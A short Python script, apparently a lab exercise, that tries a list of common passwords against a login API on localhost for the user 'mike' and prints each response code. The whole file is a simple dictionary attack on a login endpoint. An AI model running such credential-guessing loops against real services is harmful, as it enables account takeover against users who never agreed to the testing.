import requests

URL = "http://127.0.0.1:8888/api/login-with-password"

# resp = requests.post(URL, data = {"login": "vasya", "password": "1234"})

password_list = [
    "password",
    "12345",
    "qwerty",
    "1q2w3e",
    "12345678",
    "pass",
    "qwerty123",
    "mike2022"
]

LOGIN = "mike"

for password in password_list:
    data = { "login": LOGIN, "password": password}
    print("Trying:", data, end=' ')
    response =requests.post(URL, data)
    print("Code ", response.status_code, " ")
    if response.status_code != 200:
        print(response.content)
        break

print("Auth: ", response.json()['result'])
